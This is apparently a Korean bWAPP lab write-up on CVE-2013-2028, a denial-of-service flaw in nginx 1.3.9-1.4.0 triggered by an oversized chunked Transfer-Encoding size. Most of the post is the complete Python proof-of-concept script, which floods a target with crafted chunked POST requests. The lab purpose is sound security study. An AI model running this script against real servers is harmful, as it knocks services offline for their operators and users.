---
layout: single
title: (bWAPP)Denial-of-Service (Large Chunk Size)
categories: bwapp
tag: [xst,cross-site tracing, xss, bwapp, bee box, session, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

> 취약점 설명
- DoS는 서비스 거부 공격으로, 대상 시스템에 대한 가용성을 무너뜨리는 공격이다. 대표적으로 대역폭 공격, 리소스 고갈, 프로토콜 공격, 공격자 자원 고갈등이 존재한다.

![그림 1-1](image.png)
- 8080/8443 포트로 Nginx 웹 서버가 동작중이며, 해당 웹 서버는 chunked Transfer-Encoding을 통한 DoS 공격에 취약하다고 한다.

```
HTTP Chunked는 request body의 크기를 가변적으로 정할 수 있는 기능이다.
```

해당 bWAPP에서는 타겟 서버의 DoS 공격을 수행하는 악성 스크립트를 제공하고 있다.

```python
# Exploit Title: nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2028)
# Date: 16.05.2013
# Exploit Author: Mert SARICA - mert [ . ] sarica [ @ ] gmail [ . ] com - http://www.mertsarica.com
# Minor customizations by Malik Mesellem (@MME_IT)
# Vendor Homepage: http://nginx.org/
# Software Link: http://nginx.org/download/nginx-1.4.0.tar.gz
# Version: 1.3.9-1.4.0
# Tested on: Kali Linux & Windows XP (nginx v1.4.0)
# CVE : CVE-2013-2028

import httplib
import time
import socket
import sys
import os

# Vars & Defs
debug = 0
dos_packet = 0xFFFFFFFFFFFFFFEC
socket.setdefaulttimeout(1)

packet = 0

def chunk(data, chunk_size):
    chunked = ""
    chunked += "%s\r\n" % (chunk_size)
    chunked += "%s\r\n" % (data)
    chunked += "0\r\n\r\n"
    return chunked

if sys.platform == 'linux-i386' or sys.platform == 'linux2':
        os.system("clear")
elif sys.platform == 'win32':
        os.system("cls")
else:
        os.system("cls")
                
print "======================================================================"
print u"nginx v1.3.9-1.4.0 DOS POC (CVE-2013-2028) [http://www.mertsarica.com]"
print "======================================================================"

if len(sys.argv) < 2:
        print "Usage: python nginx_dos.py [target ip:port]\n"
        print "Example: python nginx_dos.py 127.0.0.1:8080\n"
        sys.exit(1)
else:
    host = sys.argv[1].lower()
        
while packet <= 66:

    body = "beezzzzzzzzzz"
    chunk_size = hex(dos_packet + 1)[3:]
    chunk_size = ("F" + chunk_size[:len(chunk_size)-1]).upper()

    if debug:
        print "data length:", len(body), "chunk size:", chunk_size[:len(chunk_size)]

    try:
        con = httplib.HTTPConnection(host)
        url = "/bWAPP/portal.php"
        con.putrequest('POST', url)
        con.putheader('User-Agent', 'bWAPP')
        con.putheader('Accept', '*/*')
        con.putheader('Transfer-Encoding', 'chunked')
        con.putheader('Content-Type', 'application/x-www-form-urlencoded')
        con.endheaders()
        con.send(chunk(body, chunk_size[:len(chunk_size)]))
    except:
        print "Connection error!"
        sys.exit(1)
        
    try:
        resp = con.getresponse()
        print(resp.status, resp.reason)
    except:
        print "[*] Knock knock, is anybody there ? (" + str(packet) + "/66)"

    packet = packet + 1
    
    con.close()

print "[+] Done!"
```

